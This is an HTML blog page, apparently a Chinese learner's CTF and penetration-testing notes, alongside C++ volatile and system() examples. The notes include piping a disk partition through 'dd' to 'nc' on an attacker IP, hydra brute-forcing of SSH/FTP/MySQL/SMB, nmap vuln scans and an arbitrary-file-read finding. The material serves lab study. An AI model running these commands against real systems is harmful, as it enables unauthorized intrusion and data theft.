@@ -1,0 +1,203 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>3.29 | 一人之下</title><meta name="author" content="小叶"><meta name="copyright" content="小叶"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.Volatile关键字，与const相反，是容易改变的意思，编译器就不会进行 优化 12345678910111213#include&lt;iostream&gt;&#96;&#96;using namespace std;&#96;&#96;int main(void)&#96;&#96;&#123;&#96;    &#96;volatile const int  a &#x3D; 7;&#96;    &#96;int  *p &#x3D; (int*)&amp;a;&#96;    &#96;*p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3.29">
+<meta property="og:url" content="http://example.com/2026/03/29/3-29/index.html">
+<meta property="og:site_name" content="一人之下">
+<meta property="og:description" content="1.Volatile关键字，与const相反，是容易改变的意思，编译器就不会进行 优化 12345678910111213#include&lt;iostream&gt;&#96;&#96;using namespace std;&#96;&#96;int main(void)&#96;&#96;&#123;&#96;    &#96;volatile const int  a &#x3D; 7;&#96;    &#96;int  *p &#x3D; (int*)&amp;a;&#96;    &#96;*p">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-03-29T02:20:23.000Z">
+<meta property="article:modified_time" content="2026-03-29T04:07:24.759Z">
+<meta property="article:author" content="小叶">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "3.29",
+  "url": "http://example.com/2026/03/29/3-29/",
+  "image": "http://example.com/img/butterfly-icon.png",
+  "datePublished": "2026-03-29T02:20:23.000Z",
+  "dateModified": "2026-03-29T04:07:24.759Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "小叶",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2026/03/29/3-29/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '3.29',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">一人之下</span></a><a class="nav-page-title" href="/"><span class="site-name">3.29</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">3.29</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-29T02:20:23.000Z" title="发表于 2026-03-29 10:20:23">2026-03-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-29T04:07:24.759Z" title="更新于 2026-03-29 12:07:24">2026-03-29</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>1.Volatile关键字，与const相反，是容易改变的意思，编译器就不会进行 优化</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>`</span></span><br><span class="line"></span><br><span class="line">`<span class="keyword">using</span> <span class="keyword">namespace</span> std;`</span><br><span class="line"></span><br><span class="line">`<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span>`</span></span><br><span class="line"><span class="function">`</span>&#123;`</span><br><span class="line">    `<span class="keyword">volatile</span> <span class="type">const</span> <span class="type">int</span>  a = <span class="number">7</span>;`</span><br><span class="line">    `<span class="type">int</span>  *p = (<span class="type">int</span>*)&amp;a;`</span><br><span class="line">    `*p = <span class="number">8</span>;`</span><br><span class="line">    `cout&lt;&lt;a;`</span><br><span class="line">    `<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);`</span><br><span class="line">    `<span class="keyword">return</span> <span class="number">0</span>;`</span><br><span class="line">`&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.system 系统函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;pause&quot;) //冻结屏幕</span><br><span class="line"></span><br><span class="line">system(&quot;color 0A&quot;)//0是背景色代号，A是前景色代号</span><br><span class="line"></span><br><span class="line">system(&quot;mkdir F:\hello\world&quot;)// 可以在F：盘下建立一个文件夹hello，在hello下面建立一个文件夹world</span><br><span class="line"></span><br><span class="line">system(&quot;del d:\123.txt&quot;);//删除文件</span><br><span class="line"></span><br><span class="line">3.LInux中也有system()函数，且与fork()相关</span><br></pre></td></tr></table></figure>
+
+<p>3.ISW,&#x2F;dev&#x2F;vda,获得系统分区获得flag</p>
+<p>1.首先需要拿到Webshell,</p>
+<p>2.之后下载磁盘镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/vda3 bs=1M | base64 //方法一，把输出的一大串 base64 全部复制，本地保存为 `disk.b64`</span><br><span class="line"></span><br><span class="line">base64 -d disk.b64 &gt; disk.img //本地解码</span><br><span class="line"></span><br><span class="line">nc -lvp 4444 &gt; disk.img // 方法二，用nc,</span><br><span class="line"></span><br><span class="line">dd if=/dev/vda3 bs=1M | nc 你的IP 4444</span><br><span class="line"></span><br><span class="line">dd if=/dev/vda3 of=/var/www/html/disk.img bs=1M //方法 3：直接写到 web 目录下载,然后浏览器访问 `http://靶机IP/disk.img`</span><br></pre></td></tr></table></figure>
+
+<p>3.本地挂载磁盘镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Linux/macOS </span><br><span class="line"></span><br><span class="line">mkdir mnt</span><br><span class="line"></span><br><span class="line">mount -o loop,ro disk.img ./mnt </span><br><span class="line"></span><br><span class="line">cd mnt</span><br><span class="line"></span><br><span class="line">如果提示需要文件系统类型 </span><br><span class="line"></span><br><span class="line">mount -o loop,ro -t ext4 disk.img ./mnt  </span><br><span class="line"></span><br><span class="line">只读挂载更安全</span><br><span class="line"></span><br><span class="line">mount -o loop,ro disk.img ./mnt</span><br></pre></td></tr></table></figure>
+
+<p>4直接搜 flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;flag&#123;&quot; ./ ```</span><br><span class="line"></span><br><span class="line"> ```grep -r &quot;FLAG&#123;&quot; ./ ```</span><br><span class="line"></span><br><span class="line"> ```grep -r &quot;flag&quot; ./ ``` </span><br><span class="line"></span><br><span class="line">或者找常见位置：</span><br><span class="line"></span><br><span class="line"> ```ls /root ```</span><br><span class="line"></span><br><span class="line"> ```ls /home ```</span><br><span class="line"></span><br><span class="line"> ```cat /root/flag.txt ```</span><br><span class="line"></span><br><span class="line"> ```cat /home/user/flag.txt ```</span><br><span class="line"></span><br><span class="line"> ```cat /flag.txt ``` </span><br></pre></td></tr></table></figure>
+
+<p>5如果 flag 被删了（数据恢复） 安装工具： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">apt install testdisk foremost ``` </span><br><span class="line"></span><br><span class="line">恢复删除文件： ```testdisk disk.img ``` </span><br><span class="line"></span><br><span class="line">或者：```foremost -i disk.img -o output ``` </span><br><span class="line"></span><br><span class="line">然后去 `output/` 里找 txt 文件。 </span><br></pre></td></tr></table></figure>
+
+<p>6Windows 下也能打开 用工具： </p>
+<p>DiskGenius</p>
+<p><strong>OSFMount</strong> </p>
+<p><strong>FTK Imager</strong> 直接打开 <code>disk.img</code></p>
+<p>浏览文件找 flag</p>
+<p>4.漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- -O --min-rate=10000 192.168.1.100 -oN nmap_full.txt</span><br><span class="line"></span><br><span class="line">nmap -sV -p- --script=vuln,exploit 192.168.1.100 -oN nmap_vuln.txt</span><br><span class="line"></span><br><span class="line">masscan 192.168.1.100 -p 1-65535 --rate=10000 -oJ masscan.json//快速扫描</span><br><span class="line"></span><br><span class="line">dirsearch -u http://192.168.1.100 -t 5 -delay 1 //带代理/延迟（防拦截）</span><br></pre></td></tr></table></figure>
+
+<p>nikto -h <a target="_blank" rel="noopener" href="http://192.168.1.100/">http://192.168.1.100</a> -o nikto.txt </p>
+<p>5弱口令爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P pass.txt ssh://192.168.1.100 -t 4</span><br><span class="line"></span><br><span class="line">hydra -L user.txt -P pass.txt ftp://192.168.1.100</span><br><span class="line"></span><br><span class="line">hydra -L user.txt -P pass.txt mysql://192.168.1.100</span><br><span class="line"></span><br><span class="line">hydra -L user.txt -P pass.txt smb://192.168.1.100 </span><br></pre></td></tr></table></figure>
+
+<p>6爆破目录后</p>
+<p>存在 <code>GET /</code> 站点根路径，可正常访问首页</p>
+<p>存在 <code>GET /test</code> 测试接口，可能用于信息泄露或功能测试</p>
+<p>支持 <code>POST /</code> 提交数据，存在接口交互功能</p>
+<p>进一步测试发现，目标存在<strong>任意文件读取漏洞</strong>，且权限为 <strong>root</strong>，可读取系统任意文件，包括 <code>/etc/passwd</code>、<code>/root/</code> 目录下敏感文件、系统磁盘分区 <code>/dev/vda3</code> 等关键资源，可通过下载系统分区镜像进行磁盘取证，进而获取 flag 等敏感信息</p>
+<p>7开启kali网卡</p>
+<p>sudo ip link set eth0 up</p>
+<p>8nano，命令指南</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ctrl O 保存</span><br><span class="line"></span><br><span class="line">ctrl X 退出</span><br><span class="line"></span><br><span class="line">ctrl K 删除行</span><br><span class="line"></span><br><span class="line">Alt A  选中部分</span><br><span class="line"></span><br><span class="line">ALt U 撤销操作</span><br><span class="line"></span><br><span class="line">ctrl U 粘贴</span><br><span class="line"></span><br><span class="line">echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.list </span><br><span class="line"></span><br><span class="line">echo &quot;deb-src http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee -a /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">小叶</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2026/03/29/3-29/">http://example.com/2026/03/29/3-29/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">一人之下</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/03/30/3-30/" title="3.3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">3.3</div></div><div class="info-2"><div class="info-item-1">1笑声 2Algorithm算法，Initalization初始化 </div></div></div></a><a class="pagination-related" href="/2025/10/29/shentouceshi3/" title="shentouceshi3"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">shentouceshi3</div></div><div class="info-2"><div class="info-item-1">yxcms 1.首先进入yxcms界面，观察漏洞(有输入框可以尝试xss,但是本网站有防护)   2.观察到公告中有漏洞，进入到登录界面,用公告中的账号密码登录(如果密码被修改，需要进行爆破尝试)  3.成功进入到yxcms的后台，找到能够编辑的信息   4.创建木马(之后的主要任务是找到木马在目标主机的绝对路径)  5.在蚁剑连接的主机中找到beifen.rar，下载，解压到本地(因为里面可能存在yxcms的源码)  6.确实存在yxcms的源码，在其中找到木马路径，用蚁剑进行连接  成功  </div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">小叶</div><div class="author-info-description">欢迎来到小叶的个人博客</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/xxxxx" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:xxxxxx@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/02/4-2/" title="4.2">4.2</a><time datetime="2026-04-02T08:38:20.000Z" title="发表于 2026-04-02 16:38:20">2026-04-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/01/4-1/" title="4.1">4.1</a><time datetime="2026-04-01T03:21:47.000Z" title="发表于 2026-04-01 11:21:47">2026-04-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/30/3-30/" title="3.3">3.3</a><time datetime="2026-03-30T02:20:15.000Z" title="发表于 2026-03-30 10:20:15">2026-03-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/29/3-29/" title="3.29">3.29</a><time datetime="2026-03-29T02:20:23.000Z" title="发表于 2026-03-29 10:20:23">2026-03-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/10/29/shentouceshi3/" title="shentouceshi3">shentouceshi3</a><time datetime="2025-10-29T12:16:59.000Z" title="发表于 2025-10-29 20:16:59">2025-10-29</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By 小叶</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
